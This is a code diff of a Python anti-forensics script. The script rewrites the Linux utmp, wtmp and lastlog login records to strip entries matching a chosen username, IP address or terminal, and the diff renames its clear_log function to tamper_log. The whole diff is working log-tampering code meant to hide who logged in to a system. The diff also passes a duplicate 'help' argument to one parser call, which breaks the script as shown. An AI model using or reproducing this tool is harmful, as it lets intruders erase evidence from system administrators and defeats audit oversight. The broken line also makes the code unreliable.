@@ -7,11 +7,12 @@ import sys
 import time
 
 
-def compare(a, b):
-    return a == b or a == None
-
-
 def match_xtmp():
+    '''
+    open xtmp log file and search for record.
+    return **unmatched** record.
+    '''
+
     try:
         matched = []
         xtmp = ""
@@ -44,16 +45,12 @@ def match_xtmp():
         Print('match log: %s falied\n%s' % (FILENAME, str(e)), level=0)
 
 
-def clear_log(contents):
-    try:
-        with open(FILENAME, 'w+b') as fp:
-            fp.write(contents)
-        Print("  [-]success!", level=0)
-    except Exception as e:
-        Print('  [-]clear log: %s falied\n%s' % (FILENAME, str(e)), level=0)
-
-
 def match_lastlog():
+    '''
+    open lastlog log file and search for record.
+    return **unmatched** record.
+    '''
+
     try:
         pw = pwd.getpwnam(USERNAME)
     except:
@@ -96,7 +93,31 @@ def match_lastlog():
         Print('match log: %s falied\n%s' % (FILENAME, str(e)), level=0)
 
 
+def tamper_log(contents):
+    '''
+    tamper the log files.
+    '''
+    try:
+        with open(FILENAME, 'w+b') as fp:
+            fp.write(contents)
+        Print("  [-]success!", level=0)
+    except Exception as e:
+        Print('  [-]clear log: %s falied\n%s' % (FILENAME, str(e)), level=0)
+
+
+def compare(a, b):
+    '''
+    unassigned == None == True
+    '''
+
+    return a == b or a == None
+
+
 def Print(msg, level):
+    '''
+    control output
+    '''
+
     print(msg)
 
 
@@ -117,17 +138,16 @@ XTMP_STRUCT_SIZE = struct.calcsize(XTMP_STRUCT)
 
 parser = argparse.ArgumentParser()
 parser.add_argument('-m', '--mode', default=0, type=int,
-                    choices=[0, 1, 2], help='[0:utmp]; 1:wtmp; 2:lastlog')
+                    choices=[0, 1, 2], help='assign log file: [0:utmp]; 1:wtmp; 2:lastlog')
 
-parser.add_argument('-f', '--filename')
+parser.add_argument('-f', '--filename', help='match records based on filename')
 
-parser.add_argument('-u', '--username')
-parser.add_argument('-i', '--ip')
-parser.add_argument('-t', '--ttyname')
+parser.add_argument('-u', '--username', help='match records based on username')
+parser.add_argument('-i', '--ip', help='match records based on ip')
+parser.add_argument('-t', '--ttyname', help='match records based on ttyname')
 
 parser.add_argument('-v', '--verbose', default=1, type=int,
-                    choices=[0, 1, 2], help='0:silent; [1]; 2:debug')
-
+                    choices=[0, 1, 2], help='0:silent; [1]; 2:debug', help='how much information you want')
 
 args = parser.parse_args()
 
@@ -151,7 +171,7 @@ if MODE in [0, 1]:
     # 1: change command: lastlog
     new_data = match_xtmp()
     if new_data != None:
-        clear_log(new_data)
+        tamper_log(new_data)
 else:
     # 2: change command: w
     if not USERNAME:
@@ -159,5 +179,4 @@ else:
 
     new_data = match_lastlog()
     if new_data != None:
-        clear_log(new_data)
-
+        tamper_log(new_data)
